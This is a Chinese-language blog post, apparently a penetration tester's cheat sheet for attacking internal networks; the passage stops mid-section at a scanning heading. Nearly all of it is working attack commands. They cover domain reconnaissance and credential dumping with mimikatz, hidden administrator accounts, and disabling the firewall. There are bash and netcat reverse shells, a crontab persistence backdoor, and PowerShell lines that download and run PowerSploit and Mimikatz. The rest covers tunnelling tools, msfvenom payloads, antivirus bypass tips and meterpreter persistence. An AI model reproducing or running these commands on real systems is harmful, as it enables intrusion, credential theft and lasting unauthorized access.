<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="17year" />
  <meta name="description" content="" />
  
  
  <title>
    
      内网备忘录 
      
      
      |
    
     17year&#39;s Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>

<meta name="generator" content="Hexo 5.4.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">17year</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">内网备忘录</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2021-12-20 15:24:01
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
                    <b>#</b> 内网渗透
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h3 id="前期收集"><a href="#前期收集" class="headerlink" title="前期收集"></a>前期收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net user  查看本机用户</span><br><span class="line">net user /domain 查看域用户</span><br><span class="line">net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view \\dc   查看dc域内共享文件</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管</span><br><span class="line">net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</span><br><span class="line">net group &quot;domain controllers&quot; /domain 域控</span><br><span class="line">net time /domain </span><br><span class="line">net config workstation   当前登录域 - 计算机名 - 用户名</span><br><span class="line">net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</span><br><span class="line">ipconfig</span><br><span class="line">systeminfo</span><br><span class="line">tasklist /svc</span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机tasklist</span><br><span class="line">net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line">netstat -ano</span><br><span class="line">nltest /dclist:xx  查看域控</span><br><span class="line">dsquery</span><br><span class="line">whoami /all 查看Mandatory Label uac级别和sid号</span><br><span class="line">net sessoin 查看远程连接session(需要管理权限)</span><br><span class="line">net share     共享目录</span><br><span class="line">cmdkey /l   查看保存登陆凭证</span><br><span class="line">echo %logonserver%  查看登陆域</span><br><span class="line">spn –l administrator spn记录</span><br><span class="line">set  环境变量</span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery computer 查询所有计算机名称windows 2003</span><br><span class="line">dir /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<ul>
<li>发现远程登录密码等密码 netpass.exe</li>
</ul>
<p>下载<a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/network_password_recovery.html">https://www.nirsoft.net/utils/network_password_recovery.html</a></p>
<ul>
<li><p>获取window vpn密码：</p>
<p>mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</p>
</li>
<li><p>wifi密码：</p>
<p>netsh wlan show profile 查处wifi名下一条命令用 netsh wlan show profile WiFi-name key=clear</p>
</li>
<li><p>ie代理</p>
<p>reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v ProxyServer<br>reg query “HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings”</p>
</li>
<li><p>pac代理</p>
<p>reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v AutoConfigURL //引 t0stmail</p>
</li>
</ul>
<h4 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ping          icmp连通性</span><br><span class="line">nslookup www.baidu.com vps-ip dns连通性</span><br><span class="line">dig @vps-ip www.baidu.com</span><br><span class="line">curl vps:8080  http连通性</span><br><span class="line">tracert</span><br><span class="line">bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 &gt;=2008</span><br><span class="line">fuser -nv tcp 80 查看端口pid</span><br><span class="line">rdesktop -u username ip linux连接win远程桌面 (有可能不成功)</span><br><span class="line">where file win查找文件是否存在 </span><br><span class="line">找路径，Linux下使用命令find -name *.jsp来查找，Windows下，使用for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i</span><br><span class="line">netstat -apn | grep 8888   kill -9 PID   查看端口并kill</span><br></pre></td></tr></table></figure>

<h3 id="3389"><a href="#3389" class="headerlink" title="3389"></a>3389</h3><p>判断是内网，还是外网，内网转发到vps</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano,没有开启3389端口,复查下</span><br><span class="line">tasklist /svc,查svchost.exe对应的TermService的pid,看netstat相等的pid即3389端口.</span><br></pre></td></tr></table></figure>

<h4 id="添加user"><a href="#添加user" class="headerlink" title="添加user"></a>添加user</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</span><br></pre></td></tr></table></figure>

<p>如不允许远程连接，修改注册表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f  </span><br></pre></td></tr></table></figure>

<p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:<br><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p>
<p>关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode=disable  </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.91ri.org/5866.html">3389user无法添加</a></p>
<h4 id="隐藏win账户"><a href="#隐藏win账户" class="headerlink" title="隐藏win账户"></a>隐藏win账户</h4><p>开启sys权限cmd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -CreateProcess &#x27;cmd.exe&#x27; -Username &#x27;nt authority\system&#x27;</span><br></pre></td></tr></table></figure>

<p>add user 并隐藏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1&#x27;)</span><br></pre></td></tr></table></figure>

<p>win server有密码强度要求，改为更复杂密码即可</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">渗透技巧——Windows系统的帐户隐藏</a><br><a target="_blank" rel="noopener" href="http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/">windows的RDP连接记录</a></p>
<h2 id="反弹，转发"><a href="#反弹，转发" class="headerlink" title="反弹，转发"></a>反弹，转发</h2><h3 id="linux-bash"><a href="#linux-bash" class="headerlink" title="linux bash"></a>linux bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br><span class="line">|</span><br><span class="line">bash -i 交互的shell</span><br><span class="line">&gt;&amp; 标准错误输出到标准输出</span><br><span class="line">/dev/tcp/10.0.0.1/8080 建立socket ip port</span><br><span class="line">0&gt;&amp;1 标准输入到标准输出</span><br><span class="line"></span><br><span class="line">(crontab -l;echo &#x27;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/port;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;)|crontab -</span><br><span class="line">猥琐版(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -</span><br><span class="line">详细介绍 https://github.com/tom0li/security_circle/blob/master/15288418585142.md</span><br></pre></td></tr></table></figure>

<h3 id="ngrok-backdoor"><a href="#ngrok-backdoor" class="headerlink" title="ngrok-backdoor"></a>ngrok-backdoor</h3><p>Grok-backdoor是一个简单的基于python的后门，它使用Ngrok隧道进行通信。Ngrok后门可以使用Pyinstaller生成windows，linux和mac二进制文件.<br>虽然免杀，但如果开win防火墙会提示，生成后门时会询问是否捆绑ngrok，选择no时，在被攻击机执行时需联网下载ngrok，运行后，telnet连接即可.<br>github <a target="_blank" rel="noopener" href="https://github.com/deepzec/Grok-backdoor">https://github.com/deepzec/Grok-backdoor</a></p>
<h3 id="veil"><a href="#veil" class="headerlink" title="veil"></a>veil</h3><p>这里，安装问题有点多，我用kali-2018-32安装成功，先安装下列依赖，后按照官方即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libncurses5*</span><br><span class="line">apt-get install libavutil55*</span><br><span class="line">apt-get install gcc-mingw-w64*</span><br><span class="line">apt-get install wine32  </span><br></pre></td></tr></table></figure>

<p>生成shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./Veil.py</span><br><span class="line">use 1</span><br><span class="line">use c/meterpreter/rev_tcp</span><br></pre></td></tr></table></figure>

<p>在win gcc -o v.exe v.c -lws2_32 用mingw下gcc编译bypass 360<br>msfconsole -r veil.rc (其中veil.rc是之前生成的，bypass)</p>
<p>python -m SimpleHTTPServer 80虚拟机里开启，在外访问虚拟机ip即可下载虚拟机文件</p>
<h3 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h3><p>tools: <a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a><br>新版tools： <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a><br>正向：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">被攻击机(跳板)：</span><br><span class="line">        temp目录下</span><br><span class="line">        unzip ew.zip</span><br><span class="line">        file /sbin/init (查看linux位数)</span><br><span class="line">        chmod 755 ew_for_Linux</span><br><span class="line">        ./ew_for_Linux -s ssocksd -l 9999 (侦听0.0.0.0:9999)</span><br><span class="line">        netstat -pantu|grep 9999 (查看是否侦听成功)</span><br><span class="line">攻击机：</span><br><span class="line">        proxychain设置socks5 为跳板ip port</span><br><span class="line">        proxychain nmap即可以用跳板代理扫描其他主机</span><br></pre></td></tr></table></figure>

<p>反向：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">    chmod 777 ./ew_for_linux64</span><br><span class="line">    ./ew_for_linux -s rcsocks -l 1080 -e 2333 即被攻击机连接本机2333端口，转发到本机的1080端口，访问本机的1080端口，相当访问被攻击机的2333</span><br><span class="line">    设置proxychain socks5 本主机ip port：1080</span><br><span class="line">    proxychain代理即可</span><br><span class="line">被攻击机：</span><br><span class="line">    chmod 777 ew_for_linux</span><br><span class="line">    ./ew_for_Linux32 -s rssocks -d 192.168.1.100 -e 2333</span><br></pre></td></tr></table></figure>

<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><a target="_blank" rel="noopener" href="https://tom0li.github.io/2017/05/06/nc/">nc简单使用</a><br>linux root 权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p  </span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc ip port 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>

<p>权限不够用mkfifo /tmp/backpipe<br>以上用nc监听即可</p>
<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被攻击机 lcx.exe -slave 139.1.2.3 8888 10.48.128.25 3389</span><br><span class="line">vps      lcx.exe –listen 8888 5555</span><br></pre></td></tr></table></figure>

<p>在本机mstsc登陆139.1.2.3:5555或在vps连接127.0.0.1:5555</p>
<h3 id="netsh-win自带-只支持tcp-360拦"><a href="#netsh-win自带-只支持tcp-360拦" class="headerlink" title="netsh win自带(只支持tcp)360拦"></a>netsh win自带(只支持tcp)360拦</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080</span><br></pre></td></tr></table></figure>

<p>将本地80转到192.168.1.101:8080端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389</span><br></pre></td></tr></table></figure>

<p>通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口</p>
<h3 id="go-msf-amp-py-msf-bypass360"><a href="#go-msf-amp-py-msf-bypass360" class="headerlink" title="go+msf &amp; py+msf bypass360"></a>go+msf &amp; py+msf bypass360</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf编码生成后，用go build -ldflags=&quot;-H windowsgui -s -w&quot;即可，详细参考以下link</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://lu4n.com/metasploit-payload-bypass-av-note/">http://lu4n.com/metasploit-payload-bypass-av-note/</a> <a target="_blank" rel="noopener" href="http://hacktech.cn/2017/04/20/msf-AntiVirus.html">http://hacktech.cn/2017/04/20/msf-AntiVirus.html</a></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>win提权辅助工具，原理主要通过systeminfo补丁信息比对漏洞库<br>工具链接 <a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
<p>linux提权辅助<br><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
<p>感谢前辈收集的提权exp，地址：<br><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits Windows平台提权漏洞集合</a><br><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits Linux平台提权漏洞集合</a></p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>linux相关payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">linux/x86/meterpreter/reverse_tcp</span><br><span class="line">linux/x86/meterpreter/bind_tcp</span><br><span class="line">linux/x86/shell_bind_tcp</span><br><span class="line">linux/x86/shell_reverse_tcp</span><br><span class="line">linux/x64/shell/bind_tcp</span><br><span class="line">linux/x64/shell/reverse_tcp</span><br><span class="line">linux/x64/shell_bind_tcp</span><br><span class="line">linux/x64/shell_bind_tcp_random_port</span><br><span class="line">linux/x64/shell_reverse_tcp</span><br></pre></td></tr></table></figure>

<p>windows相关payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/reverse_tcp</span><br><span class="line">windows/meterpreter/bind_tcp</span><br><span class="line">windows/meterpreter/reverse_hop_http</span><br><span class="line">windows/meterpreter/reverse_http</span><br><span class="line">windows/meterpreter/reverse_http_proxy_pstore</span><br><span class="line">windows/meterpreter/reverse_https</span><br><span class="line">windows/meterpreter/reverse_https_proxy</span><br><span class="line">windows/shell_reverse_tcp</span><br><span class="line">windows/shell_bind_tcp</span><br><span class="line">windows/x64/meterpreter/reverse_tcp</span><br><span class="line">windows/x64/meterpreter/bind_tcp</span><br><span class="line">windows/x64/shell_reverse_tcp</span><br><span class="line">windows/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>

<p>目标服务器为64位用x64监听，反弹meterpreter用含有meterpreter的模块，反弹普通的shell（例如nc），shell_reverse_tcp模块监听</p>
<p>例如msf:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反弹shell  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe </span><br><span class="line">监听       windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">反弹shell  nc -e cmd.exe ip port </span><br><span class="line">监听       windows/shell_reverse_tcp</span><br></pre></td></tr></table></figure>

<p>meterpreter下上传 upload file 下载 download file</p>
<h4 id="Msf进程注入-测试win10没成功-win2008-可以，360会拦"><a href="#Msf进程注入-测试win10没成功-win2008-可以，360会拦" class="headerlink" title="Msf进程注入(测试win10没成功,win2008 可以，360会拦)"></a>Msf进程注入(测试win10没成功,win2008 可以，360会拦)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: xxxx</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3456</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"> PID   PPID  Name                       Arch  Session  User          Path</span><br><span class="line">---   ----  ----                       ----  -------  ----          ----</span><br><span class="line"> 12000  676  shell.exe                  x86   2        xxx  C:\Users\xxx\Desktop\shell.exe</span><br><span class="line"> 676  1124  explorer.exe               x64   2        xxx  C:\Windows\explorer.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 676</span><br><span class="line">[*] Migrating from 12000 to 676...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>

<h4 id="Msf-hash"><a href="#Msf-hash" class="headerlink" title="Msf hash"></a>Msf hash</h4><ol>
<li>meterpreter &gt; run hashdump 需要sys权限 导出SAM</li>
<li>meterpreter &gt; run post/windows/gather/smart_hashdump 需要sys权限</li>
<li>getsystem存在uac，用msf bypass，但特征明显 meterpreter &gt; search bypassuac</li>
<li>msf powerdump load mimikatz 不太好用</li>
</ol>
<h4 id="Msf的持续后门"><a href="#Msf的持续后门" class="headerlink" title="Msf的持续后门"></a>Msf的持续后门</h4><p>Persistence: run persistence -h：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence -U -i 10 -p 10390 -r free.ngrok.cc </span><br><span class="line">会被360拦，-i 10 10秒请求一次</span><br></pre></td></tr></table></figure>

<p>使用powershell执行也被监控而被360拦截</p>
<p>meterpreter 的 run getgui -e 命令可以开启成 功。360会提示阻止</p>
<p>Run metsvc -h ：用于创建服务，会创建meterpreter服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦</p>
<h4 id="Msf-powershell"><a href="#Msf-powershell" class="headerlink" title="Msf powershell"></a>Msf powershell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load powershell</span><br><span class="line">meterpreter &gt; powershell_shell</span><br><span class="line">PS &gt; IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;);</span><br><span class="line">Ps &gt; Invoke-Mimikatz -DumpCreds</span><br></pre></td></tr></table></figure>

<h4 id="Msf-Router"><a href="#Msf-Router" class="headerlink" title="Msf Router"></a>Msf Router</h4><p>2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell session下以被攻击机访问其他内网主机.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">    [!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">    Local subnet: 172.17.0.0/255.255.0.0</span><br><span class="line">meterpreter &gt; run autoroute -s 172.17.0.0/16  添加路由</span><br><span class="line">meterpreter &gt; run autoroute -p                查看路由</span><br><span class="line">meterpreter &gt; run autoroute -d -s 172.17.0.0/16  删除</span><br></pre></td></tr></table></figure>

<p>MS17-010</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(multi/handler) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 172.17.0.0/24</span><br><span class="line">rhosts =&gt; 172.17.0.0/24</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 50</span><br><span class="line">threads =&gt; 50</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br></pre></td></tr></table></figure>

<p>先利用exploit/windows/smb/ms17_010_psexec，win10旧版依旧可以，新版设置smbuser，smbpass即可</p>
<h4 id="Msf扫描"><a href="#Msf扫描" class="headerlink" title="Msf扫描"></a>Msf扫描</h4><p>经过上面设置路由即可使用以下scan：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">常用port 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899</span><br></pre></td></tr></table></figure>

<p>服务扫描:</p>
